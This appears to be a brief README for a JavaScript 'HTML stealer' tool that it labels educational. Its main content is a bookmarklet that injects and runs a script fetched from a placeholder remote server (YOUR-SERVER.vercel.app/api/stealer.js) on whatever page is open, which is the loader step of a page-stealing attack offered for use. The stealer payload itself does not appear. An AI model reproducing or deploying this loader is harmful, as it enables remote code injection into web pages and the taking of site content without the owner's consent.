# 🕵️ HTML Stealer Script

A JavaScript-based HTML page stealer for educational purposes.

## ⚠️ Warning
This tool is for **educational purposes only**. Use only on websites you own or have permission to test.

## 🚀 Quick Start

### Bookmarklet
1. Copy this code:
```javascript
javascript:(function(){
    var s=document.createElement('script');
    s.src='https://YOUR-SERVER.vercel.app/api/stealer.js';
    document.body.appendChild(s);
    alert('Stealer activated!');
})();
